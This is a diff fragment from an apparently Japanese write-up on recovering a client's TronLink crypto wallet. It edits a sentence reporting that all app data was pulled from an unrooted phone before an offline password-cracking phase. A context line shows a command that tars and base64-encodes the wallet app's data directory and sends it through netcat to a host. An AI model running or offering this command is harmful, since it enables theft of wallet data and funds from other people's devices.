@@ -144,7 +144,7 @@ $ printf "tar -czC /data/data/com.tronlinkpro.wallet . | base64; exit\n" | nc 12
 
 ![ファイル転送](file_transfer.gif)
 
-これでアプリデータ全体を取得：`shared_prefs`、`databases`、全部。フェーズ1完了。クライアントのスマホはroot化なし、bootloaderアンロックなし、何も壊さずにそのまま。必要なものは全てPCに入った。
+これでアプリデータを丸ごと取得：`shared_prefs`、`databases`、など。フェーズ1完了。クライアントのスマホはroot化なし、bootloaderアンロックなし、何も壊さずにそのまま。必要なものはPCに入った。
 
 ## フェーズ2: オフラインでパスワードをcrackする
 
